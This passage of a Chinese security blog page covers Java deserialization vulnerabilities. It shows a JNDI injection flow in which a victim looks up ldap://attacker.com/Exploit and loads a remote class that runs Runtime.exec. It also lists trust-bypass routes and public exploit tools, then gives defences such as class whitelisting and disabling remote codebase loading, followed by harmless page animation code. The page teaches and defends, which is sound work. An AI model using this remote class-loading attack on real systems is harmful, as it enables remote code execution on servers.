+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">受害机</span><br><span class="line">   ↓</span><br><span class="line">   调用 InitialContext.lookup(&quot;ldap://attacker.com/Exploit&quot;)</span><br><span class="line">   ↓</span><br><span class="line">攻击者 LDAP / RMI</span><br><span class="line">   ↓</span><br><span class="line">   返回恶意 JNDI Reference，触发 Codebase 加载</span><br><span class="line">   ↓</span><br><span class="line">受害机</span><br><span class="line">   ↓</span><br><span class="line">   加载 http://attacker.com/Exploit.class</span><br><span class="line">   ↓</span><br><span class="line">   执行 static &#123; Runtime.getRuntime().exec(...) &#125;</span><br></pre></td></tr></table></figure>
+
+<p>绕过 JDK 高版本 trust 限制：</p>
+<ul>
+<li><strong>本地 Gadget</strong>（Tomcat EL 表达式链）</li>
+<li><strong>RMI 序列化</strong></li>
+<li><strong>LDAP Reference</strong>（高版本被禁用远程 classloader）</li>
+</ul>
+<h2 id="0x06-防御"><a href="#0x06-防御" class="headerlink" title="0x06 防御"></a>0x06 防御</h2><h3 id="1-升级组件"><a href="#1-升级组件" class="headerlink" title="1. 升级组件"></a>1. 升级组件</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 老版本 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 升级到 3.2.2+ / 4.x，添加 InvokerTransformer 反序列化检查 --&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-白名单"><a href="#2-白名单" class="headerlink" title="2. 白名单"></a>2. 白名单</h3><p>重写 <code>ObjectInputStream</code>：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SafeObjectInputStream</span> <span class="keyword">extends</span> <span class="title class_">ObjectInputStream</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Set</span>&lt;String&gt; <span class="variable">ALLOW</span> <span class="operator">=</span> Set.of(</span><br><span class="line">        <span class="string">&quot;java.lang.String&quot;</span>, <span class="string">&quot;java.lang.Number&quot;</span>, <span class="string">&quot;java.util.ArrayList&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="type">Class</span>&lt;?&gt; <span class="title function_">resolveClass</span><span class="params">(ObjectStreamClass desc)</span></span><br><span class="line">            <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">if</span> (!ALLOW.contains(desc.getName())) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(<span class="string">&quot;Unauthorized class&quot;</span>, desc.getName());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.resolveClass(desc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-关闭危险特性"><a href="#3-关闭危险特性" class="headerlink" title="3. 关闭危险特性"></a>3. 关闭危险特性</h3><ul>
+<li>Shiro 改默认密钥</li>
+<li>Fastjson <code>safeMode=true</code></li>
+<li>RMI 启用 SSL + 客户端校验</li>
+<li>禁用 JNDI 远程类加载：<code>com.sun.jndi.ldap.object.trustURLCodebase=false</code></li>
+</ul>
+<h3 id="4-监控"><a href="#4-监控" class="headerlink" title="4. 监控"></a>4. 监控</h3><ul>
+<li>RASP 监控 <code>Runtime.exec</code> &#x2F; <code>ProcessBuilder.start</code></li>
+<li>字节流 magic number 检测</li>
+</ul>
+<h2 id="0x07-工具"><a href="#0x07-工具" class="headerlink" title="0x07 工具"></a>0x07 工具</h2><table>
+<thead>
+<tr>
+<th>工具</th>
+<th>用途</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial">ysoserial</a></td>
+<td>Payload 生成</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://github.com/welk1n/JNDI-Injection-Exploit">JNDI-Injection-Exploit</a></td>
+<td>JNDI 利用</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://github.com/mbechler/marshalsec">marshalsec</a></td>
+<td>多协议 payload</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://github.com/feihong-cs/ShiroExploit">ShiroExp</a></td>
+<td>Shiro 自动化</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://github.com/hfdzmlshfj/fastjson-vul-tools">fastjson-vul-tools</a></td>
+<td>Fastjson</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://github.com/WhiteHSBG/JNDIExploit">JNDIExploit</a></td>
+<td>综合 JNDI</td>
+</tr>
+</tbody></table>
+<h2 id="0x08-总结"><a href="#0x08-总结" class="headerlink" title="0x08 总结"></a>0x08 总结</h2><p>反序列化漏洞本质是”反序列化过程会调用对象方法”这一设计。所有 Java 反序列化漏洞都能套用入口链 + 中间链 + 危险链的模板。掌握 ysoserial 一键生成 + JNDI 投递两条路，再去看各种新爆出的链会清晰很多。</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>lvyatan
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://lvyatan.github.io/2026/09/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%9D%E6%8E%A2/" title="Java 反序列化漏洞初探">https://lvyatan.github.io/2026/09/20/Java反序列化漏洞初探/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/Java/" rel="tag"># Java</a>
+              <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag"># 反序列化</a>
+              <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/" rel="tag"># 漏洞原理</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2026/09/12/CTF-Web%E9%A2%98%E5%B8%B8%E8%A7%81%E8%80%83%E7%82%B9/" rel="prev" title="CTF Web 题常见考点总结">
+                  <i class="fa fa-angle-left"></i> CTF Web 题常见考点总结
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2026/09/28/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%AC%94%E8%AE%B0/" rel="next" title="内网横向移动笔记">
+                  内网横向移动笔记 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-shield"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">true</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">11k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">41 分钟</span>
+  </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+<canvas id="particle-canvas"></canvas>
+<script>
+(function () {
+  'use strict';
+
+  // ====================================================================
+  // 1. 粒子动效：Canvas 粒子 + 连线 + 鼠标吸引
+  // ====================================================================
+  function initParticles() {
+    var canvas = document.getElementById('particle-canvas');
+    if (!canvas) return;
+    var ctx = canvas.getContext('2d');
+    var dpr = window.devicePixelRatio || 1;
+    var particles = [];
+    var mouse = { x: -9999, y: -9999, radius: 140 };
+
+    // 配置
+    var COLORS = ['#a78bfa', '#60a5fa', '#34d399', '#f472b6'];
+    var MAX_PARTICLES = window.innerWidth < 768 ? 38 : 70;
+    var LINK_DISTANCE = 130;
+
+    function resize() {
+      canvas.width = window.innerWidth * dpr;
+      canvas.height = window.innerHeight * dpr;
+      canvas.style.width = window.innerWidth + 'px';
+      canvas.style.height = window.innerHeight + 'px';
+      ctx.scale(dpr, dpr);
+    }
+
+    function Particle() {
+      this.x = Math.random() * window.innerWidth;
+      this.y = Math.random() * window.innerHeight;
+      this.vx = (Math.random() - 0.5) * 0.35;
+      this.vy = (Math.random() - 0.5) * 0.35;
+      this.radius = Math.random() * 2 + 1.2;
+      this.color = COLORS[Math.floor(Math.random() * COLORS.length)];
+      this.baseAlpha = Math.random() * 0.4 + 0.4;
+    }
+
+    Particle.prototype.update = function () {
+      // 鼠标吸引
+      var dx = mouse.x - this.x;
+      var dy = mouse.y - this.y;
+      var dist = Math.sqrt(dx * dx + dy * dy);
+      if (dist < mouse.radius) {
+        var force = (mouse.radius - dist) / mouse.radius;
+        this.vx += (dx / dist) * force * 0.06;
+        this.vy += (dy / dist) * force * 0.06;
+      }
+
+      // 摩擦
+      this.vx *= 0.985;
+      this.vy *= 0.985;
+
+      // 限速
+      var speed = Math.sqrt(this.vx * this.vx + this.vy * this.vy);
+      if (speed > 1.5) {
+        this.vx = (this.vx / speed) * 1.5;
+        this.vy = (this.vy / speed) * 1.5;
+      }
+
+      this.x += this.vx;
+      this.y += this.vy;
+
+      // 边界回弹
+      if (this.x < 0 || this.x > window.innerWidth) this.vx *= -1;
+      if (this.y < 0 || this.y > window.innerHeight) this.vy *= -1;
+      this.x = Math.max(0, Math.min(window.innerWidth, this.x));
+      this.y = Math.max(0, Math.min(window.innerHeight, this.y));
+    };
+
+    Particle.prototype.draw = function () {
+      ctx.beginPath();
+      ctx.arc(this.x, this.y, this.radius, 0, Math.PI * 2);
+      ctx.fillStyle = this.color;
+      ctx.globalAlpha = this.baseAlpha;
+      ctx.fill();
+
+      // 柔光
+      ctx.beginPath();
+      ctx.arc(this.x, this.y, this.radius * 3, 0, Math.PI * 2);
+      var grad = ctx.createRadialGradient(this.x, this.y, 0, this.x, this.y, this.radius * 3);
+      grad.addColorStop(0, this.color);
+      grad.addColorStop(1, 'transparent');
+      ctx.fillStyle = grad;
+      ctx.globalAlpha = 0.12;
+      ctx.fill();
+      ctx.globalAlpha = 1;
+    };
+
+    function drawLinks() {
+      for (var i = 0; i < particles.length; i++) {
+        for (var j = i + 1; j < particles.length; j++) {
+          var p1 = particles[i];
+          var p2 = particles[j];
+          var dx = p1.x - p2.x;
+          var dy = p1.y - p2.y;
+          var dist = Math.sqrt(dx * dx + dy * dy);
+          if (dist < LINK_DISTANCE) {
+            var alpha = (1 - dist / LINK_DISTANCE) * 0.22;
+            ctx.beginPath();
+            ctx.strokeStyle = p1.color;
+            ctx.globalAlpha = alpha;
+            ctx.lineWidth = 1;
+            ctx.moveTo(p1.x, p1.y);
+            ctx.lineTo(p2.x, p2.y);
+            ctx.stroke();
+            ctx.globalAlpha = 1;
+          }
+        }
+      }
+    }
+
+    function animate() {
+      ctx.clearRect(0, 0, window.innerWidth, window.innerHeight);
+      drawLinks();
+      for (var i = 0; i < particles.length; i++) {
+        particles[i].update();
+        particles[i].draw();
+      }
+      requestAnimationFrame(animate);
+    }
+
+    function createParticles() {
+      particles = [];
+      for (var i = 0; i < MAX_PARTICLES; i++) particles.push(new Particle());
+    }
+
+    // 初始化
+    resize();
+    createParticles();
+    animate();
+
+    // 鼠标 / 触摸
+    window.addEventListener('mousemove', function (e) {
+      mouse.x = e.clientX;
+      mouse.y = e.clientY;
+    });
+    window.addEventListener('mouseout', function () {
+      mouse.x = -9999; mouse.y = -9999;
+    });
+    window.addEventListener('touchmove', function (e) {
+      if (e.touches[0]) {
+        mouse.x = e.touches[0].clientX;
+        mouse.y = e.touches[0].clientY;
+      }
+    });
+
+    // resize
+    var resizeTimer;
+    window.addEventListener('resize', function () {
+      clearTimeout(resizeTimer);
+      resizeTimer = setTimeout(function () {
+        resize();
+        createParticles();
+      }, 200);
+    });
+
+    // 低性能模式：电池或低性能时减粒子
+    if (navigator.getBattery && navigator.getBattery()) {
+      navigator.getBattery().then(function (battery) {
+        if (battery.discharging && battery.level < 0.2) {
+          MAX_PARTICLES = 25;
+          createParticles();
+        }
+      });
+    }
+  }
+
+  // ====================================================================
+  // 2. Hero 区：仅首页注入
+  // ====================================================================
+  function injectHero() {
+    // 通过 page 配置判断是否首页
+    var pageConfigs = document.querySelectorAll('script.next-config[data-name="page"]');
+    var isHome = false;
+    for (var i = 0; i < pageConfigs.length; i++) {
+      try {
+        var cfg = JSON.parse(pageConfigs[i].textContent || '{}');
+        if (cfg.isHome === true) { isHome = true; break; }
+      } catch (e) {}
+    }
+    if (!isHome) return;
+
+    var mainInner = document.querySelector('.main-inner.index.posts-expand');
+    if (!mainInner) return;
+    if (mainInner.querySelector('.hero-section')) return; // 防止重复
+
+    var hero = document.createElement('section');
+    hero.className = 'hero-section';
+    hero.innerHTML = ''
+      + '<div class="hero-content">'
+      + '  <span class="hero-eyebrow">CYBER · SECURITY · NOTES</span>'
+      + '  <h1 class="hero-title">网安学习笔记</h1>'
+      + '  <p class="hero-subtitle">'
+      + '    记录渗透测试、漏洞挖掘、安全工具开发的实践笔记。'
+      + '    <br>每一篇都是亲手敲过的 Payload、跑过的命令、踩过的坑。'
+      + '  </p>'
+      + '  <div class="hero-actions">'
+      + '    <a class="hero-btn hero-btn--primary" href="#main">'
+      + '      <i class="fa fa-book-open"></i> 开始阅读'
+      + '    </a>'
+      + '    <a class="hero-btn hero-btn--ghost" href="/about/">'
+      + '      <i class="fa fa-user"></i> 关于本站'
+      + '    </a>'
+      + '  </div>'
+      + '</div>'
+      + '<div class="hero-scroll-hint">SCROLL</div>';
+
+    mainInner.insertBefore(hero, mainInner.firstChild);
+
+    // 入场动画
+    setTimeout(function () {
+      hero.style.opacity = '0';
+      hero.style.transform = 'translateY(20px)';
+      hero.style.transition = 'opacity 0.8s ease, transform 0.8s cubic-bezier(0.16, 1, 0.3, 1)';
+      requestAnimationFrame(function () {
+        hero.style.opacity = '1';
+        hero.style.transform = 'translateY(0)';
+      });
+    }, 50);
+  }
+
+  // ====================================================================
+  // 3. 卡片入场动画（首页文章）
+  // ====================================================================
+  function animateCards() {
+    var cards = document.querySelectorAll('.index.posts-expand .post-block');
+    if (!cards.length) return;
+    if (!('IntersectionObserver' in window)) return;
+
+    cards.forEach(function (card, idx) {
+      card.style.opacity = '0';
+      card.style.transform = 'translateY(24px)';
+      card.style.transition = 'opacity 0.6s ease ' + (idx * 0.08) + 's, transform 0.6s cubic-bezier(0.16, 1, 0.3, 1) ' + (idx * 0.08) + 's';
+    });
+
+    var io = new IntersectionObserver(function (entries) {
+      entries.forEach(function (entry) {
+        if (entry.isIntersecting) {
+          entry.target.style.opacity = '1';
+          entry.target.style.transform = 'translateY(0)';
+          io.unobserve(entry.target);
+        }
+      });
+    }, { threshold: 0.1 });
+
+    cards.forEach(function (card) { io.observe(card); });
+  }
+
+  // ====================================================================
+  // 4. 启动
+  // ====================================================================
+  function boot() {
+    try { initParticles(); } catch (e) { console.warn('particles failed:', e); }
+    try { injectHero(); } catch (e) { console.warn('hero inject failed:', e); }
+    try { animateCards(); } catch (e) {}
+  }
+
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', boot);
+  } else {
+    boot();
+  }
+
+  // PJAX 兼容（NexT 用 pjax 切页）
+  window.addEventListener('pjax:success', boot);
+})();
+</script>
+
+</body>
+</html>
